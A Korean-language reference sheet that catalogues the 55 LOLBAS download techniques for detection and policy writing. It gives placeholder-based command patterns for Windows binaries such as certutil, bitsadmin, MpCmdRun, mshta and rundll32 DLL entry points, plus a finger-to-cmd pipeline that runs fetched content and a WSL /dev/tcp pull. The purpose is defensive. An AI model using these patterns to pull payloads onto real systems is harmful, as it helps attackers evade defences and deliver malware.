# LOLBAS Download (55) — 다운로드 CLI 정리
작성일: 2026-03-14

이 문서는 **LOLBAS Download (55)** 항목을 대상으로, **운영/탐지/정책 작성용**으로 다운로드 관련 CLI를 **정규화(normalized)** 해서 정리한 것이다.
실제 공격에 바로 쓰이는 형태를 줄이기 위해, 원문의 명령은 **모두 플레이스홀더 기반**으로 정리했다.

## 기준
- 공식 API: <https://lolbas-project.github.io/api/>
- 공식 YAML 저장소: <https://github.com/LOLBAS-Project/LOLBAS/tree/master/yml>
- 본 문서의 패턴은 **현재 공식 raw YAML 엔트리** 기준으로 정규화함.

## 플레이스홀더 규칙
- `<REMOTE_URL>`: HTTP/HTTPS 등 원격 URL
- `<REMOTE_PATH_SMB_OR_WEBDAV>` / `<REMOTE_PATH_SMB>`: UNC, SMB, WebDAV 원격 경로
- `<LOCAL_PATH>` / `<LOCAL_FILE>` / `<LOCAL_FOLDER>`: 로컬 저장 위치
- `<JOB_ID>`: BITS 작업 ID
- `<PACKAGE_NAME_OR_STORE_ID>`: 패키지 이름 또는 Store ID

## 빠른 요약
- 총 **55개**: `OSBinaries 34`, `OSLibraries 3`, `OtherMSBinaries 18`
- 많은 항목이 `URL → INetCache` 또는 `Office URL open → INetCache` 계열이다.
- 일부는 순수 URL 다운로드가 아니라 `SMB/UNC/WebDAV copy`, `package update`, `DB export`, `tunnel`, `registry/config-driven` 같은 **간접 다운로드** 패턴이다.

## 운영상 주의가 필요한 예외
- `devtunnel.exe`: 공식 태그는 Download이지만, 운영상은 **Tunnel / Remote Access**로 별도 관리하는 편이 맞다.
- `Mmc.exe`: 명령행만 보면 다운로드가 드러나지 않을 수 있고, crafted `.msc` 내부 동작에 따라 다운로드가 발생한다.
- `Ldifde.exe`, `OneDriveStandaloneUpdater.exe`: URL이 명령행이 아니라 **입력 파일/레지스트리**에 숨어 있다.
- `Bcp.exe`: 인터넷 다운로드가 아니라 **DB에 저장된 페이로드를 파일로 export**하는 형태다.
- `PrintBrm.exe`: 원격 폴더를 ZIP으로 로컬에 가져오므로 운영상 **collection/exfil**과도 겹친다.

## 스타일별 묶음 (운영용)
### Office URL open → INetCache (8)
`Excel.exe`, `MSAccess.exe`, `MsoHtmEd.exe`, `Mspub.exe`, `Powerpnt.exe`, `Visio.exe`, `WinProj.exe`, `Winword.exe`

### URL fetch → INetCache (8)
`ConfigSecurityPolicy.exe`, `IMEWDBLD.exe`, `Installutil.exe`, `Mshta.exe`, `Ngen.exe`, `Presentationhost.exe`, `ECMangen.exe`, `xsd.exe`

### rundll32 + DLL entrypoint → INetCache (3)
`PhotoViewer.dll`, `Scrobj.dll`, `Shimgvw.dll`

### NuGet/Squirrel package fetch (2)
`Squirrel.exe`, `Update.exe`

### SMB/UNC fetch → CAB (2)
`Diantz.exe`, `Makecab.exe`

### .NET remote app fetch (1)
`Ieexec.exe`

### BITS job → local file (1)
`Bitsadmin.exe`

### Browser fetch / headless DOM dump (1)
`Msedge.exe`

### Browser proxy fetch (1)
`msedge_proxy.exe`

### Browser-launch helper → INetCache (1)
`VSLaunchBrowser.exe`

### Config-driven web download → %TMP% (1)
`cmdl32.exe`

### Crafted .msc-triggered download (1)
`Mmc.exe`

### Defender downloader → local file (1)
`MpCmdRun.exe`

### Finger response → cmd pipeline (1)
`Finger.exe`

### HTTP attrval-spec pull → IE temp (1)
`Ldifde.exe`

### HTTP fetch → local file / cache (1)
`Certutil.exe`

### HTTP POST response → local file (1)
`CertReq.exe`

### Linux socket/TCP pull (1)
`Wsl.exe`

### Open URL in default browser (1)
`ProtocolHandler.exe`

### Port-forward/tunnel (1)
`devtunnel.exe`

### Registry-configured updater fetch (1)
`OneDriveStandaloneUpdater.exe`

### Remote XML/XSL transform → local file (1)
`msxsl.exe`

### Scripted FTP GET → local file (1)
`Ftp.exe`

### SMB/UNC copy → folder (1)
`Replace.exe`

### SMB/UNC copy → local file (1)
`Expand.exe`

### SQL queryout → local file (1)
`Bcp.exe`

### Store/package fetch (1)
`winget.exe`

### UNC copy → local file (1)
`Esentutl.exe`

### UNC folder → ZIP (1)
`PrintBrm.exe`

### UNC/WebDAV copy → local file (1)
`Extrac32.exe`

### UNC/WebDAV stream copy → local file (1)
`Findstr.exe`

### URI handler → INetCache (1)
`AppInstaller.exe`

### URL fetch → file + lockscreen set (1)
`Desktopimgdownldr.exe`

### URL fetch → text/script (1)
`CertOC.exe`

### URL open / remote CHM (1)
`Hh.exe`

### WebDAV/SMB copy → local file (1)
`Cmd.exe`

### Wizard-driven URL fetch → INetCache (1)
`Xwizard.exe`

## OSBinaries (34)
### AppInstaller.exe
- 다운로드 스타일: **URI handler → INetCache**
- 정규화 패턴:
```bat
start ms-appinstaller://?source=<REMOTE_URL>
```
- 메모: AppInstaller URI를 통해 원격 패키지를 불러와 INetCache에 저장.

### Bitsadmin.exe
- 다운로드 스타일: **BITS job → local file**
- 정규화 패턴:
```bat
bitsadmin /create <JOB_ID> & bitsadmin /addfile <JOB_ID> <REMOTE_URL> <LOCAL_PATH> & bitsadmin /RESUME <JOB_ID> & bitsadmin /complete <JOB_ID>
```
- 메모: 공식 Download 예시는 BITS 작업을 만들어 원격 파일을 로컬 경로로 내려받음.

### CertOC.exe
- 다운로드 스타일: **URL fetch → text/script**
- 정규화 패턴:
```bat
certoc.exe -GetCACAPS <REMOTE_URL>
```
- 메모: 텍스트 형식 파일을 내려받는 패턴. 실행 기능과 구분해서 Download만 기재.

### CertReq.exe
- 다운로드 스타일: **HTTP POST response → local file**
- 정규화 패턴:
```bat
CertReq -Post -config <REMOTE_URL> <LOCAL_INPUT_FILE> <LOCAL_OUTPUT_FILE>
```
- 메모: POST 요청의 응답 본문을 로컬 파일로 저장.

### Certutil.exe
- 다운로드 스타일: **HTTP fetch → local file / cache**
- 정규화 패턴:
```bat
certutil.exe -urlcache -f <REMOTE_URL> <LOCAL_PATH>
certutil.exe -verifyctl -f <REMOTE_URL> <LOCAL_PATH>
certutil.exe -URL <REMOTE_URL>
```
- 메모: 공식 Download 항목은 세 가지. -URL은 주로 Cryptnet/URL cache 계열 저장.

### Cmd.exe
- 다운로드 스타일: **WebDAV/SMB copy → local file**
- 정규화 패턴:
```bat
type <REMOTE_PATH_SMB_OR_WEBDAV> > <LOCAL_PATH>
```
- 메모: 공식 예시는 WebDAV/SMB 경로를 로컬 파일로 리다이렉션.

### cmdl32.exe
- 다운로드 스타일: **Config-driven web download → %TMP%**
- 정규화 패턴:
```bat
cmdl32 /vpn /lan %cd%\config
```
- 메모: 실제 URL은 config 파일에 들어가며 결과는 %TMP%에 VPNXXXX.tmp 형태로 저장.

### ConfigSecurityPolicy.exe
- 다운로드 스타일: **URL fetch → INetCache**
- 정규화 패턴:
```bat
ConfigSecurityPolicy.exe <REMOTE_URL>
```
- 메모: 원격 페이로드를 내려받아 INetCache에 저장.

### Desktopimgdownldr.exe
- 다운로드 스타일: **URL fetch → file + lockscreen set**
- 정규화 패턴:
```bat
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:<REMOTE_URL> /eventName:desktopimgdownldr
```
- 메모: 다운로드 후 잠금화면 이미지로 적용하는 형태.

### Diantz.exe
- 다운로드 스타일: **SMB/UNC fetch → CAB**
- 정규화 패턴:
```bat
diantz.exe <REMOTE_PATH_SMB> <LOCAL_CAB_PATH>
```
- 메모: 원격 파일을 가져와 로컬 CAB로 압축 저장.

### Esentutl.exe
- 다운로드 스타일: **UNC copy → local file**
- 정규화 패턴:
```bat
esentutl.exe /y <REMOTE_PATH_SMB_SOURCE> /d <REMOTE_PATH_SMB_OR_LOCAL_DEST> /o
```
- 메모: 공식 Download 항목은 UNC 경로 간/또는 원격 소스에서 복사하는 패턴.

### Expand.exe
- 다운로드 스타일: **SMB/UNC copy → local file**
- 정규화 패턴:
```bat
expand <REMOTE_PATH_SMB> <LOCAL_PATH>
```
- 메모: 원격 소스를 로컬로 확장/복사.

### Extrac32.exe
- 다운로드 스타일: **UNC/WebDAV copy → local file**
- 정규화 패턴:
```bat
extrac32 /Y /C <REMOTE_PATH_SMB_OR_WEBDAV> <LOCAL_PATH>
```
- 메모: 원격 소스를 복사 및 덮어쓰기.

### Findstr.exe
- 다운로드 스타일: **UNC/WebDAV stream copy → local file**
- 정규화 패턴:
```bat
findstr /V /L <NONMATCH_TOKEN> <REMOTE_PATH_SMB_OR_WEBDAV> > <LOCAL_PATH>
```
- 메모: 일치하지 않는 토큰을 이용해 원격 파일 내용을 로컬 파일로 흘려보냄.

### Finger.exe
- 다운로드 스타일: **Finger response → cmd pipeline**
- 정규화 패턴:
```bat
finger <USER>@<REMOTE_HOST> | more +2 | cmd
```
- 메모: 원격 Finger 응답을 받아 후속 프로세스로 전달.

### Ftp.exe
- 다운로드 스타일: **Scripted FTP GET → local file**
- 정규화 패턴:
```bat
cmd.exe /c "@echo open <HOST> <PORT> > ftp.txt & @echo USER <USER> >> ftp.txt & @echo PASS <PASS> >> ftp.txt & @echo binary >> ftp.txt & @echo GET /<REMOTE_FILE> >> ftp.txt & @echo quit >> ftp.txt & @ftp -s:ftp.txt -v"
```
- 메모: 배치/스크립트 방식으로 FTP GET 수행.

### Hh.exe
- 다운로드 스타일: **URL open / remote CHM**
- 정규화 패턴:
```bat
HH.exe <REMOTE_URL>
```
- 메모: 공식 Download 예시는 URL을 HH로 여는 형태. CHM/원격 실행과 혼동 주의.

### Ieexec.exe
- 다운로드 스타일: **.NET remote app fetch**
- 정규화 패턴:
```bat
ieexec.exe <REMOTE_URL_TO_DOTNET_EXE>
```
- 메모: 다운로드 후 실행까지 이어질 수 있으나 여기서는 Download 관점만 표시.

### IMEWDBLD.exe
- 다운로드 스타일: **URL fetch → INetCache**
- 정규화 패턴:
```bat
IMEWDBLD.exe <REMOTE_URL>
```
- 메모: 사전 파일 로드 경로 악용으로 INetCache 저장.

### Installutil.exe
- 다운로드 스타일: **URL fetch → INetCache**
- 정규화 패턴:
```bat
InstallUtil.exe <REMOTE_URL>
```
- 메모: 원격 페이로드를 INetCache에 저장.

### Ldifde.exe
- 다운로드 스타일: **HTTP attrval-spec pull → IE temp**
- 정규화 패턴:
```bat
Ldifde -i -f <LDF_FILE_WITH_HTTP_ATTRVAL_SPEC>
```
- 메모: 명령행 URL 인자가 아니라 .ldf 내부의 http-based attrval-spec가 다운로드 트리거.

### Makecab.exe
- 다운로드 스타일: **SMB/UNC fetch → CAB**
- 정규화 패턴:
```bat
makecab <REMOTE_PATH_SMB> <LOCAL_CAB_PATH>
```
- 메모: 원격 파일을 받아 로컬 CAB로 압축 저장.

### Mmc.exe
- 다운로드 스타일: **Crafted .msc-triggered download**
- 정규화 패턴:
```bat
mmc.exe -Embedding <LOCAL_MSC_FILE>
```
- 메모: 공식 Download 항목이지만 명령행에 URL이 직접 안 보일 수 있음. 다운로드 동작은 crafted .msc 내 설정에 의존.

### MpCmdRun.exe
- 다운로드 스타일: **Defender downloader → local file**
- 정규화 패턴:
```bat
MpCmdRun.exe -DownloadFile -url <REMOTE_URL> -path <LOCAL_PATH>
copy "<DEFENDER_MPCMDRUN_PATH>" <LOCAL_COPY> && chdir "<DEFENDER_PLATFORM_DIR>" && "<LOCAL_COPY>" -DownloadFile -url <REMOTE_URL> -path <LOCAL_PATH>
```
- 메모: 공식 Download 예시는 기본형 1개와 우회형 1개.

### Msedge.exe
- 다운로드 스타일: **Browser fetch / headless DOM dump**
- 정규화 패턴:
```bat
msedge.exe <REMOTE_URL_WITH_HARMLESS_EXTENSION>
msedge.exe --headless --enable-logging --disable-gpu --dump-dom "<REMOTE_URL_TO_HTML_WRAPPER>" > <LOCAL_B64_PATH>
```
- 메모: 직접 열기형과 headless DOM dump형 두 가지가 공식 Download 예시.

### msedge_proxy.exe
- 다운로드 스타일: **Browser proxy fetch**
- 정규화 패턴:
```bat
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe" <REMOTE_URL>
```
- 메모: 원격 파일 다운로드. 운영상 브라우저 계열 별도 모니터링 권장.

### Mshta.exe
- 다운로드 스타일: **URL fetch → INetCache**
- 정규화 패턴:
```bat
mshta.exe <REMOTE_URL>
```
- 메모: 실행 계열 예시가 많지만 Download 항목은 원격 URL을 넘겨 INetCache 저장.

### Ngen.exe
- 다운로드 스타일: **URL fetch → INetCache**
- 정규화 패턴:
```bat
ngen.exe <REMOTE_URL>
```
- 메모: 원격 페이로드를 INetCache에 저장.

### OneDriveStandaloneUpdater.exe
- 다운로드 스타일: **Registry-configured updater fetch**
- 정규화 패턴:
```bat
OneDriveStandaloneUpdater
```
- 메모: 실제 URL은 HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig 하위 레지스트리 값에서 읽음.

### Presentationhost.exe
- 다운로드 스타일: **URL fetch → INetCache**
- 정규화 패턴:
```bat
Presentationhost.exe <REMOTE_URL>
```
- 메모: XBAP 실행 기능과 별개로 원격 URL 다운로드 가능.

### PrintBrm.exe
- 다운로드 스타일: **UNC folder → ZIP**
- 정규화 패턴:
```bat
PrintBrm -b -d <REMOTE_FOLDER_ON_UNC> -f <LOCAL_ZIP_PATH>
```
- 메모: 원격 폴더를 ZIP으로 묶어 로컬에 생성. 운영상 exfil/collection과도 겹침.

### Replace.exe
- 다운로드 스타일: **SMB/UNC copy → folder**
- 정규화 패턴:
```bat
replace.exe <REMOTE_PATH_SMB> <LOCAL_FOLDER> /A
```
- 메모: 원격 실행파일을 로컬 폴더에 복사.

### winget.exe
- 다운로드 스타일: **Store/package fetch**
- 정규화 패턴:
```bat
winget.exe install --accept-package-agreements -s msstore <PACKAGE_NAME_OR_STORE_ID>
```
- 메모: 공식 Download 예시는 msstore 소스에서 패키지/스토어 앱 다운로드.

### Xwizard.exe
- 다운로드 스타일: **Wizard-driven URL fetch → INetCache**
- 정규화 패턴:
```bat
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z<REMOTE_URL>
```
- 메모: RemoteApp and Desktop Connections wizard 악용으로 INetCache 저장.

## OSLibraries (3)
### PhotoViewer.dll
- 다운로드 스타일: **rundll32 + DLL entrypoint → INetCache**
- 정규화 패턴:
```bat
rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen <REMOTE_URL>
```
- 메모: rundll32 parent 아래에서 Windows Photo Viewer DLL이 URL을 받아 다운로드.

### Scrobj.dll
- 다운로드 스타일: **rundll32 + DLL entrypoint → INetCache**
- 정규화 패턴:
```bat
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib <REMOTE_URL>
```
- 메모: GenerateTypeLib 엔트리포인트에 URL 전달.

### Shimgvw.dll
- 다운로드 스타일: **rundll32 + DLL entrypoint → INetCache**
- 정규화 패턴:
```bat
rundll32.exe C:\Windows\System32\shimgvw.dll,ImageView_Fullscreen <REMOTE_URL>
```
- 메모: ImageView_Fullscreen/ImageView_FullscreenA 계열 다운로드.

## OtherMSBinaries (18)
### Bcp.exe
- 다운로드 스타일: **SQL queryout → local file**
- 정규화 패턴:
```bat
bcp "SELECT <PAYLOAD_COLUMN> FROM <DB>.<SCHEMA>.<TABLE> WHERE <COND>" queryout "<LOCAL_PATH>" -S <SQL_SERVER> -T -c
```
- 메모: 공식 Download 항목이지만 인터넷이 아니라 DB 저장 페이로드를 파일시스템으로 내보내는 형태.

### devtunnel.exe
- 다운로드 스타일: **Port-forward/tunnel**
- 정규화 패턴:
```bat
devtunnel.exe host -p 8080
```
- 메모: 공식 태그는 Download지만 운영상은 Tunnel/Remote Access로 별도 분류 권장.

### ECMangen.exe
- 다운로드 스타일: **URL fetch → INetCache**
- 정규화 패턴:
```bat
ECMangen.exe <REMOTE_URL>
```
- 메모: Exchange 관련 도구의 단순 URL fetch.

### Excel.exe
- 다운로드 스타일: **Office URL open → INetCache**
- 정규화 패턴:
```bat
Excel.exe <REMOTE_URL>
```
- 메모: Office 바이너리 공통형.

### MSAccess.exe
- 다운로드 스타일: **Office URL open → INetCache**
- 정규화 패턴:
```bat
MSAccess.exe <REMOTE_URL>
```
- 메모: 공식 설명상 .mdb 확장자일 때 다운로드 동작.

### MsoHtmEd.exe
- 다운로드 스타일: **Office URL open → INetCache**
- 정규화 패턴:
```bat
MsoHtmEd.exe <REMOTE_URL>
```
- 메모: Office HTML editor component.

### Mspub.exe
- 다운로드 스타일: **Office URL open → INetCache**
- 정규화 패턴:
```bat
mspub.exe <REMOTE_URL>
```
- 메모: Publisher URL open.

### msxsl.exe
- 다운로드 스타일: **Remote XML/XSL transform → local file**
- 정규화 패턴:
```bat
msxsl.exe <REMOTE_XML_URL> <REMOTE_XSL_URL> -o <LOCAL_PATH>
```
- 메모: 원격 XML/XSL 변환 결과를 디스크로 저장.

### Powerpnt.exe
- 다운로드 스타일: **Office URL open → INetCache**
- 정규화 패턴:
```bat
Powerpnt.exe <REMOTE_URL>
```
- 메모: PowerPoint URL open.

### ProtocolHandler.exe
- 다운로드 스타일: **Open URL in default browser**
- 정규화 패턴:
```bat
ProtocolHandler.exe <REMOTE_URL>
```
- 메모: 기본 브라우저로 URL을 열어 다운로드가 발생할 수 있음.

### Squirrel.exe
- 다운로드 스타일: **NuGet/Squirrel package fetch**
- 정규화 패턴:
```bat
squirrel.exe --download <REMOTE_URL>
```
- 메모: 공식 Download 항목은 --download. --update/--updateRollback은 Download+Execute 계열이므로 별도 해석.

### Update.exe
- 다운로드 스타일: **NuGet/Squirrel package fetch**
- 정규화 패턴:
```bat
Update.exe --download <REMOTE_URL>
```
- 메모: 공식 Download 항목은 --download.

### Visio.exe
- 다운로드 스타일: **Office URL open → INetCache**
- 정규화 패턴:
```bat
Visio.exe <REMOTE_URL>
```
- 메모: Visio URL open.

### VSLaunchBrowser.exe
- 다운로드 스타일: **Browser-launch helper → INetCache**
- 정규화 패턴:
```bat
VSLaunchBrowser.exe .exe <REMOTE_URL_TO_EXE>
```
- 메모: 파일 확장자를 지정해 기본 연결 앱으로 열며, INetCache에 저장 후 열기까지 이어질 수 있음.

### WinProj.exe
- 다운로드 스타일: **Office URL open → INetCache**
- 정규화 패턴:
```bat
WinProj.exe <REMOTE_URL>
```
- 메모: Project URL open.

### Winword.exe
- 다운로드 스타일: **Office URL open → INetCache**
- 정규화 패턴:
```bat
winword.exe <REMOTE_URL>
```
- 메모: Word URL open.

### Wsl.exe
- 다운로드 스타일: **Linux socket/TCP pull**
- 정규화 패턴:
```bat
wsl.exe --exec bash -c 'cat < /dev/tcp/<REMOTE_HOST>/<PORT> > <LOCAL_FILENAME>'
```
- 메모: WSL bash를 이용한 TCP 수신형 다운로드.

### xsd.exe
- 다운로드 스타일: **URL fetch → INetCache**
- 정규화 패턴:
```bat
xsd.exe <REMOTE_URL>
```
- 메모: SDK 포함 도구의 단순 URL fetch.

